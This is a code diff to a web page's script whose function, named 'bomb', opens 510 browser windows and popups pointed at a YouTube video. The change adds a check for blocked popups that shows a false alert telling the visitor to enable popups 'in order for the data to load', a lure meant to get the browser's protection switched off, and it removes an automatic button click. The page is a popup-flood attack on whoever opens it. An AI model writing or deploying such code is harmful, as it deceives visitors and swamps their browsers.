@@ -15,13 +15,20 @@
      <script>
      var url = "https://www.youtube.com/watch?v=-51AfyMqnpI";
      function bomb() {
+       window.open("");
+       let newWin = window.open("");             
+
+        if(!newWin || newWin.closed || typeof newWin.closed=='undefined') 
+        { 
+            alert("Hey, you need to enable popups in order for the data to load.");
+            return;
+        }
        for (let i = 0; i < 255; i++) {
          window.open(url, '_blank');
        } 
        for (let j = 0; j < 255; j++) {
          window.open(url, "", "width=200,height=100");
        }
-       document.getElementById("button").click();
      }
      </script>
   </body>
